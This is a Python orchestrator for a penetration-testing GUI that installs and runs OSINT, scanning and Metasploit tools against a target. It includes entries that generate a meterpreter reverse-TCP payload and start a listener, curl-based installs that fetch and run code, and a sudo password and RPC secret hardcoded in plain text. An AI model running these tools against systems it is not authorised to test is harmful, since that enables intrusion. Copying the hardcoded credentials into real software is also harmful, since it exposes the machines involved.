#!/usr/bin/env python3
"""
AuditX Backend Orchestrator
Handles tool detection, auto-install, and execution.
Outputs structured JSON lines for the Quickshell frontend.
"""

import sys
import os
import json
import subprocess
import shutil
import threading
import time
import argparse
import re

# Ensure user local bin is in PATH for pip-installed binaries
local_bin = os.path.expanduser("~/.local/bin")
if local_bin not in os.environ.get("PATH", "").split(os.pathsep):
    os.environ["PATH"] = local_bin + os.pathsep + os.environ.get("PATH", "")

# ─── Tool Definitions ────────────────────────────────────────────────────────

TOOLS = {
    "sherlock": {
        "display": "Sherlock",
        "category": "OSINT",
        "description": "Username hunt across social networks",
        # sherlock-project installs binary as "sherlock"
        "check": ["sherlock"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sherlock-project"],
        "input_type": "username",
        "build_cmd": lambda target, opts: ["sherlock", "--print-found", "--no-color", "--output", "/tmp/sherlock_out.txt", target],
        "parse": "sherlock",
    },
    "theharvester": {
        "display": "theHarvester",
        "category": "OSINT",
        "description": "Collect emails, subdomains, and IPs from a domain",
        # Binary name varies: "theHarvester" (Arch/Kali package) or "theharvester" (pip install)
        "check": ["theHarvester", "theharvester"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "theHarvester"],
        "input_type": "domain",
        "build_cmd": lambda target, opts: [_find_binary(["theHarvester", "theharvester"]), "-d", target, "-b", "all", "-f", "/tmp/harvester_out"],
        "parse": "theharvester",
    },
    "sublist3r": {
        "display": "Sublist3r",
        "category": "OSINT",
        "description": "Fast subdomains enumeration",
        # Sublist3r binary is typically "sublist3r" — install via pacman or pip
        "check": ["sublist3r", "Sublist3r"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sublist3r"],
        "input_type": "domain",
        "build_cmd": lambda target, opts: [_find_binary(["sublist3r", "Sublist3r"]) or "sublist3r", "-d", target, "-o", "/tmp/sublist3r_out.txt"],
        "parse": "sublist3r",
    },
    "nmap": {
        "display": "Nmap",
        "category": "Network",
        "description": "Port scanning and service detection",
        "check": ["nmap"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "nmap"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["nmap", "-sV", "--open", "-oX", "/tmp/nmap_out.xml", target],
        "parse": "nmap",
    },
    "rustscan": {
        "display": "RustScan",
        "category": "Network",
        "description": "Ultra-fast port scanner",
        "check": ["rustscan"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "rustscan"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["rustscan", "-a", target, "--", "-sV"],
        "parse": "generic",
    },
    "nikto": {
        "display": "Nikto",
        "category": "Web",
        "description": "Web server vulnerability scanner",
        "check": ["nikto"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "nikto"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["nikto", "-h", target, "-Format", "json", "-output", "/tmp/nikto_out.json"],
        "parse": "nikto",
    },
    "whatweb": {
        "display": "WhatWeb",
        "category": "Web",
        "description": "Web technology fingerprinting",
        "check": ["whatweb"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "whatweb"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["whatweb", "--log-json=/tmp/whatweb_out.json", target],
        "parse": "whatweb",
    },
    "sqlmap": {
        "display": "SQLMap",
        "category": "Web",
        "description": "Automatic SQL injection detection",
        "check": ["sqlmap"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sqlmap"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["sqlmap", "-u", target, "--batch", "--output-dir=/tmp/sqlmap_out"],
        "parse": "generic",
    },
    "metasploit": {
        "display": "Metasploit Aux",
        "category": "Network",
        "description": "Metasploit auxiliary service & SMB fingerprinting scanner",
        "check": ["msfconsole"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfconsole", "-q", "-x",
            f"use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS 21,22,80,443,445,3389,8080; run; use auxiliary/scanner/smb/smb_version; set RHOSTS {target}; run; exit"
        ],
        "parse": "generic",
    },
    "msf_rpc": {
        "display": "Metasploit RPC",
        "category": "Exploit/Audit",
        "description": "Metasploit MSFRPC API Orchestrator (Auxiliary Scanners via msfrpcd)",
        "check": ["msfconsole", "msfrpcd"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "pymetasploit3"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["msf_rpc", target],
        "parse": "generic",
    },
    "msfvenom": {
        "display": "Msfvenom Payload",
        "category": "Exploit/Audit",
        "description": "Generate Linux meterpreter reverse TCP payload (/tmp/payload.elf)",
        "check": ["msfvenom"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
            f"LHOST={target}", "LPORT=4444", "-f", "elf", "-o", "/tmp/payload.elf"
        ],
        "parse": "generic",
    },
    "nuclei": {
        "display": "Nuclei",
        "category": "Vulnerability",
        "description": "Fast and customizable vulnerability scanner based on simple YAML based DSL.",
        "check": ["nuclei"],
        "install_cmd": ["bash", "-c", "curl -sL https://github.com/projectdiscovery/nuclei/releases/download/v3.3.2/nuclei_3.3.2_linux_amd64.zip -o /tmp/nuclei.zip && unzip -o /tmp/nuclei.zip -d ~/.local/bin/ nuclei && chmod +x ~/.local/bin/nuclei"],
        "input_type": "url",
        "build_cmd": lambda target, opts: [
            "nuclei", "-u", target, "-no-color",
            "-severity", "low,medium,high,critical",
            "-timeout", "10", "-retries", "1"
        ],
        "parse": "generic",
    },
    "msf_listener": {
        "display": "MSF Listener",
        "category": "Exploit/Audit",
        "description": "Start a reverse TCP listener (linux/x64/meterpreter/reverse_tcp)",
        "check": ["msfconsole"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfconsole", "-q", "-x",
            "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
        ],
        "parse": "generic",
    },
    "gobuster": {
        "display": "Gobuster",
        "category": "Web",
        "description": "Directory and file busting tool",
        "check": ["gobuster"],
        "install_cmd": ["bash", "-c", "echo '956124' | sudo -S pacman -S --noconfirm gobuster"],
        "input_type": "url",
        "build_cmd": lambda target, opts: [
            "gobuster", "dir", "-u", target, "-w", "/home/avrlln/wordlists/common.txt", "-q", "-t", "10"
        ],
        "parse": "generic",
    },
    "netexec": {
        "display": "NetExec (CME)",
        "category": "Network",
        "description": "Swiss army knife for pentesting Active Directory / SMB environments",
        "check": ["netexec"],
        "install_cmd": ["bash", "-c", "echo '956124' | sudo -S pacman -S --noconfirm --needed python-pipx rust cargo && pipx install git+https://github.com/Pennyw0rth/NetExec.git"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["netexec", "smb", target, "--shares", "--verbose", "--no-progress"],
        "parse": "generic",
    },
    "enum4linux-ng": {
        "display": "Enum4Linux-NG",
        "category": "Network",
        "description": "Next gen Windows/Samba enumeration tool",
        "check": ["enum4linux-ng.py", "enum4linux-ng"],
        "install_cmd": ["bash", "-c", "curl -sL https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/enum4linux-ng.py -o ~/.local/bin/enum4linux-ng && chmod +x ~/.local/bin/enum4linux-ng && pip3 install --user --break-system-packages impacket"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["enum4linux-ng", "-A", target],
        "parse": "generic",
    },
    "gitleaks": {
        "display": "Gitleaks",
        "category": "OSINT",
        "description": "Secret and credential leak scanner for git repositories/directories",
        "check": ["gitleaks"],
        "install_cmd": ["bash", "-c", "echo '956124' | sudo -S pacman -S --noconfirm gitleaks"],
        "input_type": "path",
        "build_cmd": lambda target, opts: ["gitleaks", "dir", target, "-v", "--no-color"],
        "parse": "generic",
    },
}

# ─── Output Helpers ───────────────────────────────────────────────────────────

def emit(event: str, **kwargs):
    """Emit a structured JSON line to stdout."""
    payload = {"event": event, "ts": time.time(), **kwargs}
    print(json.dumps(payload), flush=True)

# ─── Binary helpers ───────────────────────────────────────────────────────────

def _find_binary(candidates) -> str:
    """Return the first candidate binary name found in PATH, or the first candidate as fallback."""
    if isinstance(candidates, str):
        candidates = [candidates]
    for c in candidates:
        if shutil.which(c):
            return c
    return candidates[0]

# ─── Tool Detection & Install ─────────────────────────────────────────────────

def check_tool(name: str) -> bool:
    """Check if any of the tool's known binary names exist in PATH."""
    meta = TOOLS.get(name, {})
    candidates = meta.get("check", [name])
    if isinstance(candidates, str):
        candidates = [candidates]
    return any(shutil.which(c) is not None for c in candidates)

def get_tool_status() -> dict:
    return {name: check_tool(name) for name in TOOLS}

def install_tool(name: str):
    meta = TOOLS.get(name)
    if not meta:
        emit("install_error", tool=name, message="Unknown tool")
        return False
    emit("install_start", tool=name)
    cmd = meta["install_cmd"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0:
            emit("install_done", tool=name, success=True)
            return True
        else:
            emit("install_done", tool=name, success=False, message=proc.stderr[:500])
            return False
    except subprocess.TimeoutExpired:
        emit("install_done", tool=name, success=False, message="Timeout during install")
        return False
    except Exception as e:
        emit("install_done", tool=name, success=False, message=str(e))
        return False

# ─── Execution ────────────────────────────────────────────────────────────────

def run_msf_rpc(target: str):
    tool_name = "msf_rpc"
    emit("tool_start", tool=tool_name, cmd=f"msfrpcd API client -> target: {target}")
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
    except ImportError:
        emit("tool_error", tool=tool_name, message="pymetasploit3 library missing. Run `pip3 install pymetasploit3`")
        return False

    pass_code = "auditx_secret"
    port = 55553
    client = None

    emit("tool_output", tool=tool_name, line="[*] Connecting to MSF RPC Daemon on 127.0.0.1:55553...")
    try:
        client = MsfRpcClient(pass_code, port=port, ssl=True)
    except Exception:
        emit("tool_output", tool=tool_name, line="[*] Daemon not active, starting msfrpcd daemon...")
        subprocess.Popen(["msfrpcd", "-P", pass_code, "-a", "127.0.0.1", "-p", str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for attempt in range(12):
            time.sleep(1.5)
            try:
                client = MsfRpcClient(pass_code, port=port, ssl=True)
                break
            except Exception:
                pass

    if not client:
        emit("tool_error", tool=tool_name, message="Could not connect to MSF RPC Daemon after startup")
        return False

    emit("tool_output", tool=tool_name, line="[+] Successfully authenticated to MSF RPC Daemon!")
    try:
        mod_count = len(client.modules.auxiliary)
        emit("tool_output", tool=tool_name, line=f"[*] Loaded Auxiliary Modules: {mod_count}")
    except Exception:
        pass

    scans = [
        ("auxiliary/scanner/portscan/tcp", {"RHOSTS": target, "PORTS": "21,22,80,443,445,3389,8080"}),
        ("auxiliary/scanner/http/http_version", {"RHOSTS": target}),
        ("auxiliary/scanner/smb/smb_version", {"RHOSTS": target}),
    ]

    for mod_name, opts in scans:
        emit("tool_output", tool=tool_name, line=f"[*] Executing MSF RPC Module: {mod_name}...")
        try:
            mod = client.modules.use('auxiliary', mod_name)
            job = mod.execute(**opts)
            job_id = job.get('job_id')
            emit("tool_output", tool=tool_name, line=f"[+] Job {job_id} launched for {mod_name}")
            
            start_t = time.time()
            while time.time() - start_t < 15:
                if str(job_id) not in client.jobs.list:
                    emit("tool_output", tool=tool_name, line=f"[+] Module {mod_name} execution completed.")
                    break
                time.sleep(1)
        except Exception as e:
            emit("tool_output", tool=tool_name, line=f"[!] Error running module {mod_name}: {e}")

    emit("tool_done", tool=tool_name, exit_code=0)
    return True

def stream_process(tool_name: str, cmd: list, timeout: int = 300):
    """Run a subprocess and stream stdout/stderr line by line."""
    emit("tool_start", tool=tool_name, cmd=" ".join(cmd))
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        for line in iter(proc.stdout.readline, ""):
            line = line.rstrip()
            if line:
                emit("tool_output", tool=tool_name, line=line)
        proc.wait(timeout=timeout)
        code = proc.returncode
        emit("tool_done", tool=tool_name, exit_code=code)
        return code == 0
    except FileNotFoundError:
        emit("tool_error", tool=tool_name, message=f"Command not found: {cmd[0]}")
        return False
    except subprocess.TimeoutExpired:
        proc.kill()
        emit("tool_error", tool=tool_name, message="Execution timeout")
        return False
    except Exception as e:
        emit("tool_error", tool=tool_name, message=str(e))
        return False

def run_tool(tool_name: str, target: str):
    meta = TOOLS.get(tool_name)
    if not meta:
        emit("tool_error", tool=tool_name, message="Unknown tool")
        return

    if not check_tool(tool_name):
        emit("tool_missing", tool=tool_name)
        installed = install_tool(tool_name)
        if not installed:
            return

    if tool_name == "msf_rpc":
        run_msf_rpc(target)
    elif tool_name == "msf_listener":
        cmd = meta["build_cmd"](target, {})
        stream_process(tool_name, cmd, timeout=3600)
    elif tool_name == "nuclei":
        cmd = meta["build_cmd"](target, {})
        stream_process(tool_name, cmd, timeout=1800)
    else:
        cmd = meta["build_cmd"](target, {})
        stream_process(tool_name, cmd)

def run_full_audit(target: str, tools: list):
    emit("audit_start", target=target, tools=tools)
    for tool_name in tools:
        run_tool(tool_name, target)
    emit("audit_done", target=target)

# ─── Entry Point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="AuditX Backend")
    sub = parser.add_subparsers(dest="cmd")

    # Status command
    sub.add_parser("status", help="Check which tools are installed")

    # Run single tool
    run_p = sub.add_parser("run", help="Run a single tool")
    run_p.add_argument("tool", help="Tool name")
    run_p.add_argument("target", help="Target (IP/domain/URL/username)")

    # Full audit
    audit_p = sub.add_parser("audit", help="Run all/selected tools")
    audit_p.add_argument("target", help="Target")
    audit_p.add_argument("--tools", nargs="+", default=list(TOOLS.keys()))

    # Install a tool
    inst_p = sub.add_parser("install", help="Install a tool")
    inst_p.add_argument("tool")

    args = parser.parse_args()

    if args.cmd == "status":
        status = get_tool_status()
        emit("status", tools=status)

    elif args.cmd == "run":
        run_tool(args.tool, args.target)

    elif args.cmd == "audit":
        run_full_audit(args.target, args.tools)

    elif args.cmd == "install":
        install_tool(args.tool)

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
